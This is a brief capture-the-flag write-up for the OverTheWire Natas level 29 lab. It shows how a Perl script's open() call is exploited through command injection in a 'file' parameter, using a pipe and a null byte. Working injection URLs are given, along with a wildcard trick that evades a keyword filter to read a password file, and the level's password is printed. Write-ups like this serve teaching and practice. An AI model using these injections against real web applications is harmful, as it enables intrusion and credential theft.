---
layout: default
title: natas29
---

We can see it gets a file and reads it, using `perl`.

From here [piping in open function perl](https://perldoc.perl.org/functions/open#Opening-a-filehandle-into-a-command), we can see that if you supply `|` and then `cmd` else, it will execute `cmd`. 

also, we need to supply `%00` to null terminate the string at the end. (`perl` is based on `C`).

* input:
> `http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00`
* output:
> `index.pl perl underground 2.txt perl underground 3.txt perl underground 4.txt perl underground 5.txt perl underground.txt`

Okay, so let's read the password:
* input:
> `|more%20/etc/natas_webpass/natas29%20-l%00`
* output:
> no output, gets `meeeeeep!`, probably it WAFing the word `natas`

Let's try bypassing, by using regex, like `nata*`

* input:
> `|more%20/etc/nata*/nata*30%20-l%00`
* output:
> `:::::::::::::: /etc/natas_webpass/natas30 :::::::::::::: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`

I'm using `more` because `cat`, `head` and `tail` not working. 

**Flag:** ***`WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`*** 